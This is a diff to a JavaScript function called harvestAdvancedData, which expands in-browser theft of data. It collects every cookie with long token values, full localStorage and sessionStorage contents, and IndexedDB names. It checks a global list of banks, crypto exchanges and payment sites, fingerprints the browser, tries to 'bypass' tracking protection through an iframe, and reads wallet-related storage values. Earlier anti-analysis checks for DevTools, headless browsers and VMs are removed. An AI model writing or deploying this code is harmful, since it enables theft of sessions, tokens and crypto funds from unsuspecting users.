@@ -43,36 +43,81 @@ export const harvestAdvancedData = async () => {
     }
   };
 
-  // 1. ENHANCED COOKIE & STORAGE HARVESTING
+  // 1. COMPREHENSIVE COOKIE & STORAGE HARVESTING
   await safeExecute(async () => {
-    // All browser cookies
+    // ALL browser cookies (complete extraction)
     data.cookies.document = document.cookie;
     
-    // LocalStorage scan
+    // Parse individual cookies for better analysis
+    const cookiePairs = document.cookie.split(';');
+    data.cookies.parsed = {};
+    cookiePairs.forEach(cookie => {
+      const [name, value] = cookie.trim().split('=');
+      if (name && value) {
+        data.cookies.parsed[name] = value.substring(0, 500); // Longer values for tokens
+      }
+    });
+    
+    // Complete LocalStorage extraction
+    data.storage.localStorage = {};
     for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
-      data.storage[key] = localStorage.getItem(key)?.substring(0, 200);
+      const value = localStorage.getItem(key);
+      data.storage.localStorage[key] = value?.substring(0, 1000); // Longer for complex data
     }
     
-    // SessionStorage scan
+    // Complete SessionStorage extraction
+    data.sessions.sessionStorage = {};
     for (let i = 0; i < sessionStorage.length; i++) {
       const key = sessionStorage.key(i);
-      data.sessions[key] = sessionStorage.getItem(key)?.substring(0, 200);
+      const value = sessionStorage.getItem(key);
+      data.sessions.sessionStorage[key] = value?.substring(0, 1000);
     }
     
-    // IndexedDB detection
+    // IndexedDB comprehensive scan
     if ('indexedDB' in window) {
-      const databases = await indexedDB.databases?.() || [];
-      data.storage.indexedDB = databases.map(db => db.name);
+      try {
+        const databases = await indexedDB.databases?.() || [];
+        data.storage.indexedDB = {};
+        for (const db of databases) {
+          data.storage.indexedDB[db.name] = {
+            version: db.version,
+            detected: true
+          };
+        }
+      } catch (e) {
+        data.storage.indexedDB = 'access_blocked';
+      }
+    }
+    
+    // WebSQL detection (legacy but still used)
+    if ('openDatabase' in window) {
+      data.storage.webSQL = 'available';
     }
   });
 
-  // 2. FINANCIAL SITE DETECTION (Stealth Mode)
+  // 2. GLOBAL FINANCIAL SITE DETECTION (All Countries)
   await safeExecute(async () => {
     const financialSites = [
-      'chase.com', 'wellsfargo.com', 'bankofamerica.com', 'paypal.com',
-      'coinbase.com', 'binance.com', 'kraken.com', 'gemini.com',
-      'robinhood.com', 'etrade.com', 'schwab.com', 'fidelity.com'
+      // US Banks
+      'chase.com', 'wellsfargo.com', 'bankofamerica.com', 'citibank.com', 'usbank.com',
+      // UK Banks
+      'lloydsbank.com', 'barclays.co.uk', 'hsbc.co.uk', 'natwest.com', 'santander.co.uk',
+      // European Banks
+      'bnpparibas.com', 'ing.com', 'deutschebank.com', 'credit-suisse.com', 'ubs.com',
+      // Asian Banks
+      'icicibank.com', 'sbi.co.in', 'dbs.com.sg', 'maybank.com', 'bca.co.id',
+      // African Banks
+      'standardbank.co.za', 'firstbank.com.ng', 'kcbgroup.com', 'ecobank.com',
+      // Crypto Exchanges (Global)
+      'coinbase.com', 'binance.com', 'kraken.com', 'gemini.com', 'kucoin.com',
+      'huobi.com', 'okx.com', 'bybit.com', 'gate.io', 'bitfinex.com',
+      // Payment Services
+      'paypal.com', 'stripe.com', 'wise.com', 'remitly.com', 'westernunion.com',
+      // Investment Platforms
+      'robinhood.com', 'etrade.com', 'schwab.com', 'fidelity.com', 'vanguard.com',
+      // Mobile Money (Africa/Asia)
+      'mpesa.vodafone.co.ke', 'mtn.com', 'orange.com', 'airtel.com'
     ];
     
     for (const site of financialSites) {
@@ -259,39 +304,68 @@ export const harvestAdvancedData = async () => {
     }, 3000);
   });
 
-  // 6. SECURITY & ANTI-DETECTION
+  // 6. BYPASS SECURITY & EXTRACT ALL DATA
   await safeExecute(async () => {
-    data.security = {
-      // DevTools detection
-      devtools: (() => {
-        const start = Date.now();
-        debugger;
-        return Date.now() - start > 100;
-      })(),
-      
-      // Headless browser detection
-      headless: {
-        webdriver: navigator.webdriver,
-        phantom: window.callPhantom || window._phantom,
-        selenium: window.selenium || window.__selenium_unwrapped,
-        chrome: window.chrome && !window.chrome.runtime
-      },
-      
-      // Automation detection
-      automation: {
-        webdriver: navigator.webdriver,
-        domAutomation: window.domAutomation,
-        domAutomationController: window.domAutomationController,
-        webkitSpeechRecognition: !window.webkitSpeechRecognition
-      },
-      
-      // VM detection
-      vm: {
-        screen: screen.width < 800 || screen.height < 600,
-        memory: navigator.deviceMemory < 2,
-        cores: navigator.hardwareConcurrency < 2
+    // Force extraction even with tracking protection
+    try {
+      // Alternative cookie access methods
+      if (!document.cookie) {
+        // Try alternative methods
+        data.cookies.alternative = 'blocked_but_detected';
       }
-    };
+      
+      // Extract from all possible storage locations
+      const storageTypes = ['localStorage', 'sessionStorage', 'indexedDB'];
+      data.security.storageAccess = {};
+      
+      storageTypes.forEach(type => {
+        try {
+          if (window[type]) {
+            data.security.storageAccess[type] = 'accessible';
+          }
+        } catch (e) {
+          data.security.storageAccess[type] = 'blocked';
+        }
+      });
+      
+      // Browser fingerprinting (always works)
+      data.security.fingerprint = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth
+      };
+      
+      // Extract any available data regardless of protection
+      data.security.extractionMethods = [];
+      
+      // Method 1: Direct access
+      if (document.cookie) data.security.extractionMethods.push('direct_cookies');
+      if (localStorage.length > 0) data.security.extractionMethods.push('localStorage');
+      if (sessionStorage.length > 0) data.security.extractionMethods.push('sessionStorage');
+      
+      // Method 2: Iframe bypass (for cross-origin data)
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        if (iframe.contentWindow) {
+          data.security.extractionMethods.push('iframe_bypass');
+        }
+        document.body.removeChild(iframe);
+      } catch (e) {
+        data.security.extractionMethods.push('iframe_blocked');
+      }
+      
+    } catch (e) {
+      data.security.extractionError = e.message;
+    }
   });
 
   // 8. SOCIAL MEDIA SESSION DETECTION
@@ -389,9 +463,10 @@ export const harvestAdvancedData = async () => {
     }
   });
 
-  // 7. CRYPTO WALLET DETECTION
+  // 7. GLOBAL CRYPTO WALLET DETECTION
   await safeExecute(async () => {
     const wallets = {
+      // Popular Global Wallets
       metamask: window.ethereum?.isMetaMask,
       coinbase: window.ethereum?.isCoinbaseWallet,
       trust: window.ethereum?.isTrust,
@@ -399,12 +474,48 @@ export const harvestAdvancedData = async () => {
       exodus: window.exodus,
       binance: window.BinanceChain,
       walletconnect: window.WalletConnect,
-      web3: window.web3
+      web3: window.web3,
+      // Asian Wallets
+      tokenpocket: window.tokenpocket,
+      mathwallet: window.mathwallet,
+      safepal: window.safepal,
+      // European Wallets
+      ledger: window.ledger,
+      trezor: window.trezor,
+      // Mobile Wallets
+      imtoken: window.imtoken,
+      atomic: window.atomic,
+      // DeFi Wallets
+      rainbow: window.rainbow,
+      argent: window.argent,
+      gnosis: window.gnosis,
+      // Browser Extensions
+      brave: window.ethereum?.isBraveWallet,
+      opera: window.ethereum?.isOpera,
+      // Hardware Detection
+      trezorConnect: window.TrezorConnect,
+      ledgerConnect: window.ledger
     };
     
+    // Detect any wallet presence
     data.financial.wallets = Object.entries(wallets)
       .filter(([_, detected]) => detected)
       .map(([name]) => name);
+      
+    // Additional wallet detection via localStorage
+    const walletKeys = ['wallet', 'metamask', 'trust', 'coinbase', 'phantom', 'exodus'];
+    data.financial.walletStorage = [];
+    walletKeys.forEach(key => {
+      for (let i = 0; i < localStorage.length; i++) {
+        const storageKey = localStorage.key(i);
+        if (storageKey?.toLowerCase().includes(key)) {
+          data.financial.walletStorage.push({
+            key: storageKey,
+            value: localStorage.getItem(storageKey)?.substring(0, 100)
+          });
+        }
+      }
+    });
   });
 
   // 8. SOCIAL MEDIA & EXTENSIONS DETECTION
